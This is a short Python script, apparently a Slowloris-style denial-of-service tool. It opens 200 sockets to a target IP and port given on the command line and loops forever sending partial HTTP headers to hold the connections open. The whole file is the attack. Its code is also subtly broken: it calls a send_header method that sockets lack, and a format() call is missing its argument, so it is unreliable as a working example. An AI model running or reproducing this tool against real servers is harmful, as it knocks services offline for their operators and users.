import sys
import socket
import random

STANDARD_GET_REQUEST = "GET / HTTP/1.1"
SOCKET_CONNECTIONS = []

def create_connection(ip, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))
    SOCKET_CONNECTIONS.append(s)
    s.send(str.encode(STANDARD_GET_REQUEST))

def initiateAttack(ip, port):
    for _ in range(200):
        create_connection(ip, port)
    
    while True:
        for connection in SOCKET_CONNECTIONS:
            try:
                connection.send_header("X-a", random.randint(1,2000))
            except socket.error:
                SOCKET_CONNECTIONS.remove(connection)
        print("Socket Count: {0}".format())

def main():
    ip = sys.argv[1]
    port = sys.argv[2]
    initiateAttack(ip, int(port))

if __name__ == "__main__":
    main()